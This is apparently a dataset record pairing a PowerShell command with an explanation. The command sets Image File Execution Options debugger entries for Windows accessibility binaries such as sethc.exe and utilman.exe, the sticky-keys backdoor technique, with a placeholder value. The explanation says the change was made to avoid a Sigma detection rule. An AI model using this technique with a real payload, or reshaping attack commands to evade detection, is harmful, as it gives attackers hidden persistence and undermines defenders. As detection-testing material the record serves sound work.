output: powershell.exe -Command "& {$input_table = 'osk.exe, sethc.exe, utilman.exe, magnify.exe, narrator.exe, DisplaySwitch.exe, atbroker.exe'.split(',') $Name = 'Debugger' $Value = 'C:\Lab\input\sample.txt' Foreach ($item in $input_table){ $item = $item.trim() $registryPath = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$item' IF(!(Test-Path $registryPath)) { New-Item -Path $registryPath -Force New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force } ELSE { New-ItemProperty -Path $registryPath -Name $name -Value $Value } }}"
explanation: Substitution: Replaced the suspicious registry value with a benign placeholder (C:\Lab\input\sample.txt) to avoid triggering the Sigma rule while maintaining the same command-line structure.
